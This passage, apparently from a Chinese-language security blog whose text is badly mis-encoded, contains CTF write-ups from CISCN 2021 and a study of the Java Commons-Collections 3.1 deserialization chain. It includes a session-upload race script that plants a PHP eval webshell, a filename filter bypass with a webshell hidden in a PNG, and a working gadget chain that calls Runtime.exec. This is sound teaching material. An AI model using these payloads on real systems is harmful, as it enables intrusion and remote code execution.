++self::$c; } function r() { return ++self::$c; } function s() { return ++self::$c; } function t() { return ++self::$c; }}$rc=$_GET[&quot;rc&quot;]; //ç±»å$rb=$_GET[&quot;rb&quot;]; //ç¬¬äºŒä¸ªå‚æ•°$ra=$_GET[&quot;ra&quot;]; //ç¬¬ä¸€ä¸ªå‚æ•°$rd=$_GET[&quot;rd&quot;]; //è°ƒç”¨ç±»çš„æ–¹æ³•$method= new $rc($ra, $rb);var_dump($method-&gt;$rd()); åˆ©ç”¨getDocCommentè¯»å–æ³¨é‡Š åœ¨ReflectionMethodç±»æ„é€ æ–¹æ³•ä¼ å…¥ç±»åå’Œæ–¹æ³•å è¯»å–flag 1http://124.70.0.162:24336/index.php?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment middle_sourceæ‰«æç›®å½•å¾—åˆ° 1http://124.70.0.162:24363/you_can_seeeeeeee_me.php åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å« https://www.freebuf.com/news/202819.html 12345678910111213141516171819202122232425262728293031#coding=utf-8import ioimport requestsimport threadingimport timesessid = 'TGAO'data = {&quot;cmd&quot;:&quot;var_dump(scandir('/etc/fecccibbdc/bdaaaaedef/fcjgecchaa/idchbadaha/ehdchcjedh/fl444444g'));&quot;,&quot;cf&quot;:&quot;../../../var/lib/php/sessions/cccdbabbhf/sess_&quot;+sessid}def write(session): while True: f = io.BytesIO(b'a' * 1024 * 50) resp = session.post( 'http://124.70.0.162:24363', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )def read(session): while True: resp = session.post('http://124.70.0.162:24363',data=data) print(resp.text) time.sleep(0.1) # if 'passwd' in resp.text: # print(resp.text) # break # event.clear() else: print(&quot;[+++++++++++++]retry&quot;)if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in xrange(1,30): threading.Thread(target=write,args=(session,)).start() for i in xrange(1,30): threading.Thread(target=read,args=(session,)).start() event.set() å¾—åˆ°etcç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•ï¼Œå‘ç°fecccibbdcç›®å½• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234[0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;.pwd.lock&quot; [3]=&gt; string(3) &quot;X11&quot; [4]=&gt; string(12) &quot;adduser.conf&quot; [5]=&gt; string(12) &quot;alternatives&quot; [6]=&gt; string(7) &quot;apache2&quot; [7]=&gt; string(10) &quot;apparmor.d&quot; [8]=&gt; string(3) &quot;apt&quot; [9]=&gt; string(11) &quot;bash.bashrc&quot; [10]=&gt; string(17) &quot;bash_completion.d&quot; [11]=&gt; string(22) &quot;bindresvport.blacklist&quot; [12]=&gt; string(8) &quot;binfmt.d&quot; [13]=&gt; string(15) &quot;ca-certificates&quot; [14]=&gt; string(20) &quot;ca-certificates.conf&quot; [15]=&gt; string(6) &quot;cron.d&quot; [16]=&gt; string(10) &quot;cron.daily&quot; [17]=&gt; string(11) &quot;cron.weekly&quot; [18]=&gt; string(6) &quot;dbus-1&quot; [19]=&gt; string(12) &quot;debconf.conf&quot; [20]=&gt; string(14) &quot;debian_version&quot; [21]=&gt; string(7) &quot;default&quot; [22]=&gt; string(12) &quot;deluser.conf&quot; [23]=&gt; string(4) &quot;dhcp&quot; [24]=&gt; string(4) &quot;dpkg&quot; [25]=&gt; string(11) &quot;environment&quot; [26]=&gt; string(10) &quot;fecccibbdc&quot; [27]=&gt; string(5) &quot;fstab&quot; [28]=&gt; string(8) &quot;gai.conf&quot; [29]=&gt; string(5) &quot;group&quot; [30]=&gt; string(6) &quot;group-&quot; [31]=&gt; string(7) &quot;gshadow&quot; [32]=&gt; string(8) &quot;gshadow-&quot; [33]=&gt; string(9) &quot;host.conf&quot; [34]=&gt; string(8) &quot;hostname&quot; [35]=&gt; string(5) &quot;hosts&quot; [36]=&gt; string(4) &quot;init&quot; [37]=&gt; string(6) &quot;init.d&quot; [38]=&gt; string(7) &quot;inputrc&quot; [39]=&gt; string(7) &quot;insserv&quot; [40]=&gt; string(12) &quot;insserv.conf&quot; [41]=&gt; string(14) &quot;insserv.conf.d&quot; [42]=&gt; string(5) &quot;issue&quot; [43]=&gt; string(9) &quot;issue.net&quot; [44]=&gt; string(6) &quot;kernel&quot; [45]=&gt; string(11) &quot;ld.so.cache&quot; [46]=&gt; string(10) &quot;ld.so.conf&quot; [47]=&gt; string(12) &quot;ld.so.conf.d&quot; [48]=&gt; string(4) &quot;ldap&quot; [49]=&gt; string(5) &quot;legal&quot; [50]=&gt; string(13) &quot;libaudit.conf&quot; [51]=&gt; string(12) &quot;locale.alias&quot; [52]=&gt; string(10) &quot;locale.gen&quot; [53]=&gt; string(9) &quot;localtime&quot; [54]=&gt; string(8) &quot;logcheck&quot; [55]=&gt; string(10) &quot;login.defs&quot; [56]=&gt; string(11) &quot;logrotate.d&quot; [57]=&gt; string(11) &quot;lsb-release&quot; [58]=&gt; string(10) &quot;machine-id&quot; [59]=&gt; string(5) &quot;magic&quot; [60]=&gt; string(10) &quot;magic.mime&quot; [61]=&gt; string(7) &quot;mailcap&quot; [62]=&gt; string(13) &quot;mailcap.order&quot; [63]=&gt; string(10) &quot;mime.types&quot; [64]=&gt; string(11) &quot;mke2fs.conf&quot; [65]=&gt; string(14) &quot;modules-load.d&quot; [66]=&gt; string(4) &quot;mtab&quot; [67]=&gt; string(5) &quot;mysql&quot; [68]=&gt; string(8) &quot;networks&quot; [69]=&gt; string(13) &quot;nsswitch.conf&quot; [70]=&gt; string(3) &quot;opt&quot; [71]=&gt; string(10) &quot;os-release&quot; [72]=&gt; string(8) &quot;pam.conf&quot; [73]=&gt; string(5) &quot;pam.d&quot; [74]=&gt; string(6) &quot;passwd&quot; [75]=&gt; string(7) &quot;passwd-&quot; [76]=&gt; string(4) &quot;perl&quot; [77]=&gt; string(3) &quot;php&quot; [78]=&gt; string(7) &quot;profile&quot; [79]=&gt; string(9) &quot;profile.d&quot; [80]=&gt; string(9) &quot;python3.8&quot; [81]=&gt; string(8) &quot;rc.local&quot; [82]=&gt; string(5) &quot;rc0.d&quot; [83]=&gt; string(5) &quot;rc1.d&quot; [84]=&gt; string(5) &quot;rc2.d&quot; [85]=&gt; string(5) &quot;rc3.d&quot; [86]=&gt; string(5) &quot;rc4.d&quot; [87]=&gt; string(5) &quot;rc5.d&quot; [88]=&gt; string(5) &quot;rc6.d&quot; [89]=&gt; string(5) &quot;rcS.d&quot; [90]=&gt; string(11) &quot;resolv.conf&quot; [91]=&gt; string(3) &quot;rmt&quot; [92]=&gt; string(9) &quot;securetty&quot; [93]=&gt; string(8) &quot;security&quot; [94]=&gt; string(7) &quot;selinux&quot; [95]=&gt; string(6) &quot;shadow&quot; [96]=&gt; string(7) &quot;shadow-&quot; [97]=&gt; string(6) &quot;shells&quot; [98]=&gt; string(4) &quot;skel&quot; [99]=&gt; string(3) &quot;ssl&quot; [100]=&gt; string(6) &quot;subgid&quot; [101]=&gt; string(7) &quot;subgid-&quot; [102]=&gt; string(6) &quot;subuid&quot; [103]=&gt; string(7) &quot;subuid-&quot; [104]=&gt; string(11) &quot;sysctl.conf&quot; [105]=&gt; string(8) &quot;sysctl.d&quot; [106]=&gt; string(7) &quot;systemd&quot; [107]=&gt; string(8) &quot;terminfo&quot; [108]=&gt; string(8) &quot;timezone&quot; [109]=&gt; string(10) &quot;tmpfiles.d&quot; [110]=&gt; string(8) &quot;ucf.conf&quot; [111]=&gt; string(4) &quot;udev&quot; [112]=&gt; string(3) &quot;ufw&quot; [113]=&gt; string(13) &quot;update-motd.d&quot; [114]=&gt; string(3) &quot;vim&quot; [115]=&gt; string(6) &quot;wgetrc&quot; [116]=&gt; string(3) &quot;xdg&quot; æŒ‰ç…§é¡ºåºéå†ç›®å½•ï¼Œå¾—åˆ°flagè·¯å¾„ 1/etc/fecccibbdc/bdaaaaedef/fcjgecchaa/idchbadaha/ehdchcjedh/fl444444g åŒ…å«æ–‡ä»¶å¾—åˆ°flag 1cf=../../../etc/fecccibbdc/bdaaaaedef/fcjgecchaa/idchbadaha/ehdchcjedh/fl444444g uploadæœ€åä¸€æ³¢è¯•å·çš„é¢˜ç›®ï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥ï¼Œåœ¨buuä¸Šè¿›è¡Œå¤ç° æœ‰ä¸¤ä¸ªé¡µé¢ï¼šindex.phpå’Œexample.php index.phpï¼šä¸Šä¼ æ–‡ä»¶ example.phpï¼šè§£å‹æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132//index.php&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) { highlight_file(__FILE__); die();}if(isset($_GET[&quot;ctf&quot;])) $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;upload&quot;) { if ($_FILES['postedFile']['size'] &gt; 1024*512) { die(&quot;è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ&quot;); } $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']); if ($imageinfo === FALSE) { die(&quot;å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†&quot;); } if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) { die(&quot;ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ&quot;); } $fileName=urldecode($_FILES['postedFile']['name']); if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) { die(&quot;æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†&quot;); } $imagePath = &quot;/var/www/html/image/&quot; . mb_strtolower($fileName); if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) { echo &quot;upload success, image at $imagePath&quot;; } else { die(&quot;ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»&quot;); }} è§£å‹æ–‡ä»¶ 12345678910111213141516171819202122232425262728293031323334353637383940414243//example.php&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) { highlight_file(__FILE__); die();}if(isset($_GET[&quot;ctf&quot;])) $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;poc&quot;) { $zip = new \\ZipArchive(); $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;]; if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) { die(&quot;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&quot;); } if ($zip-&gt;open($name_for_zip) !== TRUE) { die (&quot;éƒ½ä¸èƒ½è§£å‹å‘¢&quot;); } echo &quot;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&quot;; $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); $zip-&gt;extractTo($pos_for_zip); $zip-&gt;close(); unlink($name_for_zip); $files = glob(&quot;$pos_for_zip/*&quot;); foreach($files as $file){ if (is_dir($file)) { continue; } $first = imagecreatefrompng($file); $size = min(imagesx($first), imagesy($first)); $second = imagecrop($first, ['x' =&gt; 0, 'y' =&gt; 0, 'width' =&gt; $size, 'height' =&gt; $size]); if ($second !== FALSE) { $final_name = pathinfo($file)[&quot;basename&quot;]; imagepng($second, 'example/'.$final_name); imagedestroy($second); } imagedestroy($first); unlink($file); }} å¯ä»¥å…ˆåœ¨index.phpä¸Šä¼ ä¸€ä¸ªåŒ…å«phpæ–‡ä»¶çš„zipæ–‡ä»¶ï¼Œç„¶ååœ¨example.phpä¸­è§£å‹ éœ€è¦ç»•è¿‡ä¸¤å¤„ 11.getImagesize é•¿åº¦å’Œå®½åº¦stristrè¿‡æ»¤ ç»•è¿‡getimagesize getimagesizeè¿”å›æ•°ç»„çš„ç´¢å¼• 0ï¼Œ1åˆ†åˆ«æ˜¯å®½åº¦å’Œé«˜åº¦ï¼Œä¹Ÿå°±æ˜¯ä¸Šä¼ å›¾ç‰‡çš„å®½åº¦å’Œé«˜åº¦å¿…é¡»éƒ½ä¸º1ã€‚ç»•è¿‡æ–¹æ³•å¦‚ä¸‹ 1#define width 1#define height 1 åˆ©ç”¨unicodeå­—ç¬¦ç»•è¿‡stristr ç›´æ¥ä¸Šä¼ zipæ–‡ä»¶ï¼Œiä¼šè¢«è¿‡æ»¤ï¼Œç”±äºä½¿ç”¨äº†mb_strtolowerå¤„ç†æ–‡ä»¶åï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨unicodeå­—ç¬¦ç»•è¿‡ 1&lt;?phpvar_dump(mb_strtolower('Ä°')==='i');echo urlencode(&quot;Ä°&quot;); //%C4%B0?&gt; å¯ä»¥çœ‹åˆ°ä¸¤è€…ç›¸ç­‰ åˆ©ç”¨éšå†™å·¥å…·ç”Ÿæˆä¸€ä¸ªåŒ…å«phpä»£ç çš„pngæ–‡ä»¶ï¼Œphpä»£ç ä¸º 1&lt;?=$_GET[0]($_POST[1]);?&gt; ä¸Šä¼ è„šæœ¬ 123456789101112131415import requestsproxies = { &quot;http&quot;: 'http://127.0.0.1:8080', &quot;https&quot;: 'http://127.0.0.1:8080'}url=&quot;http://e0a5fbcf-c0bc-44e2-b258-a10f8553f7f3.node3.buuoj.cn/?ctf=upload&quot;data = { 'postedFile': 'nginx'}files = {'postedFile': open(&quot;1.zip&quot;, 'rb')}response = requests.post(url, files=files,proxies=proxies)print(response.text) ä¿®æ”¹æ–‡ä»¶åä¸­çš„iä¸ºunicodeå­—ç¬¦ï¼ŒåŒæ—¶æ·»åŠ ç»•è¿‡é•¿å®½é™åˆ¶çš„å­—ç¬¦ä¸² ä¸Šä¼ æˆåŠŸ åœ¨example.phpè§£å‹æ–‡ä»¶ é¢˜ç›®æç¤ºflagä¿å­˜åœ¨/etc/ä¸­çš„å¤šçº§ç›®å½•ä¸‹ï¼Œé€’å½’è®¿é—®ä¸€ä¸‹å³å¯ æ‹¿åˆ°flag","link":"/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"javaååºåˆ—åŒ–å­¦ä¹ -CommonsCollections3.1","text":"commons-collections-3.1Java commons-collectionsæ˜¯JDK 1.2ä¸­çš„ä¸€ä¸ªä¸»è¦æ–°å¢éƒ¨åˆ†ã€‚å®ƒæ·»åŠ äº†è®¸å¤šå¼ºå¤§çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥åŠ é€Ÿå¤§å¤šæ•°é‡è¦Javaåº”ç”¨ç¨‹åºçš„å¼€å‘ã€‚ä»é‚£æ—¶èµ·ï¼Œå®ƒå·²ç»æˆä¸ºJavaä¸­å…¬è®¤çš„é›†åˆå¤„ç†æ ‡å‡†ã€‚ æ¼æ´å­˜åœ¨ç‰ˆæœ¬ä¸º3.1 123456789&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; pocæ‰§è¡Œè¿‡ç¨‹12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import org.apache.commons.collections.*;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class Commons_collections_Test { public static void main(String[] args) throws Exception { //1.å®¢æˆ·ç«¯æ„å»ºæ”»å‡»ä»£ç  //æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç  Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }), new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;}) }; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±» Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChina Map innerMap = new HashMap(); innerMap.put(&quot;value&quot;, &quot;value&quot;); //ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾ Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //åå°„æœºåˆ¶è°ƒç”¨AnnotationInvocationHandlerç±»çš„æ„é€ å‡½æ•° Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); //å–æ¶ˆæ„é€ å‡½æ•°ä¿®é¥°ç¬¦é™åˆ¶ ctor.setAccessible(true); //è·å–AnnotationInvocationHandlerç±»å®ä¾‹ Object instance = ctor.newInstance(Target.class, outerMap); //payloadåºåˆ—åŒ–å†™å…¥æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“ FileOutputStream f = new FileOutputStream(&quot;payload.bin&quot;); ObjectOutputStream fout = new ObjectOutputStream(f); fout.writeObject(instance); //2.æœåŠ¡ç«¯è¯»å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“ FileInputStream fi = new FileInputStream(&quot;payload.bin&quot;); ObjectInputStream fin = new ObjectInputStream(fi); //æœåŠ¡ç«¯ååºåˆ—åŒ– fin.readObject(); }} è°ƒç”¨æ ˆ org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#setValue é¦–å…ˆè¿›å…¥setValueï¼Œè°ƒç”¨äº†checkSetValue org.apache.commons.collections.map.TransformedMap#checkSetValue this.valueTransformerç­‰äºChainedTransformerç±»ï¼Œè°ƒç”¨äº†ChainedTransformerç±»ä¸­çš„transformæ–¹æ³• org.apache.commons.collections.functors.ChainedTransformer#transform æ ¹æ®this.iTransformersæ•°ç»„çš„å€¼å¯ä»¥çŸ¥é“ï¼Œç¬¬ä¸€æ¬¡è¿›å…¥çš„æ˜¯ConstantTransformerç±»çš„transformæ–¹æ³•ï¼Œåä¸‰æ¬¡è¿›å…¥çš„æ˜¯InvokerTransformerç±»çš„transformã€‚transformçš„è¿”å›å€¼ä¼šä½œä¸ºä¸‹ä¸ªtransformå‡½æ•°çš„å‚æ•°ï¼Œ çœ‹ä¸€ä¸‹ChainedTransformerçš„æ„é€ å‡½æ•°ï¼Œå¯ä»¥å‘ç°this.iTransformerså¯æ§ org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer ç¬¬ä¸€æ¬¡è¿›å…¥çš„transform org.apache.commons.collections.functors.InvokerTransformer#transform åä¸‰æ¬¡è¿›å…¥InvokerTransformerçš„Transformeræ–¹æ³•ï¼Œè¿™é‡Œå­˜åœ¨åå°„è°ƒç”¨ï¼Œå‚æ•°å¯æ§ã€‚ 12345setValue()-&gt;checkSetvalue()-&gt;`ChainedTransformer`ç±»ä¸­çš„`transform`æ–¹æ³•-&gt;å››æ¬¡å¾ªç¯ï¼Œç¬¬ä¸€æ¬¡è¿›å…¥ConstantTransformerçš„transformï¼Œåä¸‰æ¬¡è¿›å…¥InvokerTransformerçš„transform-&gt;è§¦å‘åå°„ åå°„é“¾org.apache.commons.collections.functors.InvokerTransformer#transform è¿™é‡Œå®ç°äº†åå°„è°ƒç”¨ï¼Œå¦‚æœinputç­‰äºRuntimeç±»ï¼Œé‚£ä¹ˆinput.getClassè·å–åˆ°çš„æ˜¯java.lang.classï¼Œæ— æ³•è·å–åˆ°æ–¹æ³•ï¼Œå¿…é¡»è®©inputç­‰äºRuntimeå®ä¾‹ 1234567891011121314151617public Object transform(Object input) { if (input == null) { return null; } else { try { //inputå¿…é¡»ä¸ºRuntimeçš„å®ä¾‹ï¼Œclsæ‰ä¼šç­‰äºRuntimeç±»ï¼Œ Class cls = input.getClass(); //this.iMethodNameç­‰äºexecï¼Œthis.iParamTypesç­‰äºString.class Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //this.Argsä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ return method.invoke(input, this.iArgs); } ......... }} çœ‹ä¸€ä¸‹æ„é€ å‡½æ•°ï¼Œä¸‰ä¸ªå±æ€§éƒ½æ˜¯ä¼ å…¥å‚æ•° å‚è€ƒåå°„å‘½ä»¤æ‰§è¡Œä»£ç  123456Class.forName(&quot;java.lang.Runtime&quot;) .getMethod(&quot;exec&quot;, String.class) .invoke( Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)) , &quot;calc.exe&quot; ); éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ 1234this.iMethodName=â€œexecâ€this.iParamTypes=String.classinput=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))this.iArgs=&quot;calc.exe&quot; å°è¯•å°è¯•æ„é€ æ‰§è¡Œå‘½ä»¤ 12345678910import org.apache.commons.collections.functors.InvokerTransformer;public class Commons_collections_Test { public static void main(String[] args) throws Exception { InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new String[]{&quot;calc.exe&quot;}); invokerTransformer.transform(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))); }} å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œä½†æ˜¯è¿˜å­˜åœ¨ä¸€ä¸ªé—®é¢˜å°±æ˜¯æ— æ³•ä¼ å…¥Runtimeçš„å®ä¾‹å¯¹è±¡ã€‚ ä¸¤ç§è·å–Runtimeå®ä¾‹çš„é”™è¯¯æ€è·¯ç”¨readObjectæ¨¡æ‹Ÿååºåˆ—åŒ– åºåˆ—åŒ– 123456789101112131415161718192021222324252627282930313233import org.apache.commons.collections.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;public class Commons_collections_Test { public static void main(String[] args) throws Exception { //æ„é€ InvokerTransformer InvokerTransformer a=new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new String[]{&quot;calc.exe&quot;}); //åºåˆ—åŒ– FileOutputStream f=new FileOutputStream(&quot;payload.bin&quot;); ObjectOutputStream fout=new ObjectOutputStream(f); fout.writeObject(a); //æ„é€ ä¼ å…¥transformçš„å‚æ•°ï¼ŒRuntimeå®ä¾‹ Object input=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)); //ååºåˆ—åŒ– FileInputStream fi=new FileInputStream(&quot;payload.bin&quot;); ObjectInputStream fin=new ObjectInputStream(fi); InvokerTransformer b=(InvokerTransformer) fin.readObject(); //è§¦å‘æ¼æ´ï¼Œè°ƒç”¨transformï¼Œinputä¸ºä¼ å…¥å‚æ•° b.transform(input); }} ååºåˆ—åŒ– å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå¿…é¡»ç»™transformä¼ å…¥ä¸€ä¸ªæ„é€ å¥½çš„Runtimeå®ä¾‹ä¹Ÿå°±æ˜¯inputæ‰å¯ä»¥è§¦å‘æ¼æ´ï¼Œå®é™…ç¯å¢ƒé‡Œä¸å¯èƒ½æœ‰è¿™æ ·ä¸€ä¸ªæ„é€ å¥½çš„å®ä¾‹ï¼Œé‚£ä¹ˆèƒ½å¦åˆ©ç”¨ååºåˆ—åŒ–ç»™transformä¼ å…¥Runtimeå®ä¾‹å‘¢ï¼Ÿ 123456789101112131415161718192021import org.apache.commons.collections.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.ObjectInputStream;import java.io.Serializable;public class Serial implements Serializable { public static void main(String[] args) throws Exception{ //æ„é€ ä¼ å…¥transformçš„å‚æ•°ï¼Œä¸ºRuntimeå®ä¾‹ï¼Œ Object input=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)); //ååºåˆ—åŒ– FileInputStream fi=new FileInputStream(&quot;payload.bin&quot;); ObjectInputStream fin=new ObjectInputStream(fi); InvokerTransformer b=(InvokerTransformer) fin.readObject(); //è§¦å‘æ¼æ´ï¼Œè°ƒç”¨transformï¼Œinputä¸ºä¼ å…¥å‚æ•° b.transform(input); }} org.apache.commons.collections.functors.ChainedTransformer#transform è¿™é‡Œå¯ä»¥æ§åˆ¶ä¼ å…¥transformçš„å‚æ•°ï¼Œå› ä¸ºobjectçš„æ¥æºæ˜¯ä¸Šä¸€æ¬¡this.ITransformers[i].transformçš„è¿”å›å€¼ï¼Œè€Œä¸”å› ä¸ºiTransformerså¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„ä¸€ä¸ªç±»çš„transformæ–¹æ³• org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶this.iContantï¼Œå®ƒä¼šç­‰äºä¸‹ä¸€æ¬¡æ‰§è¡Œçš„ä¼ å…¥å‚æ•°objectã€‚è¡¨é¢ä¸Šçœ‹è®©å®ƒç­‰äºRuntimeå®ä¾‹å°±è§£å†³äº†ä¹‹å‰æ— æ³•ä¼ å…¥Runtimeå®ä¾‹çš„é—®é¢˜ï¼Œä½†æ˜¯å®é™…ä¸Šå¹¶ä¸å¯è¡Œï¼Œå› ä¸ºRuntimeç±»ä¸èƒ½è¢«ååºåˆ—åŒ– 123456789101112131415161718192021222324252627282930313233import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;public class Commons_collections_Test { public static void main(String[] args) throws Exception { //æ„é€ Transformersæ•°ç»„ Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new String[]{&quot;calc.exe&quot;}) }; //ç”¨ChainedTransformerå°è£…æ„é€ å¥½çš„Transformersæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è®©æ„é€ å¥½çš„æ•°ç»„ç­‰äºthis.iTransformers Transformer transformerChain=new ChainedTransformer(transformers); //åºåˆ—åŒ– FileOutputStream f=new FileOutputStream(&quot;payload.bin&quot;); ObjectOutputStream fout=new ObjectOutputStream(f); fout.writeObject(transformerChain); }} æ‰§è¡Œå¤±è´¥ æ¢ä¸€ç§æ€è·¯ï¼Œæœ‰æ²¡æœ‰å¯èƒ½åˆ©ç”¨åå°„ç›´æ¥åœ¨æœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªRuntimeå®ä¾‹ï¼Ÿ 123456789101112131415161718192021222324252627import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;public class Commons_collections_Test { public static void main(String[] args) throws Exception { //æ„é€ transformers Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getRuntime&quot;,new Class[]{},new Object[]{}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new String[]{&quot;calc.exe&quot;}) }; Transformer transformerChain=new ChainedTransformer(transformers); transformerChain.transform(null); }} ä¾ç„¶æŠ¥é”™ï¼ŒåŸå› 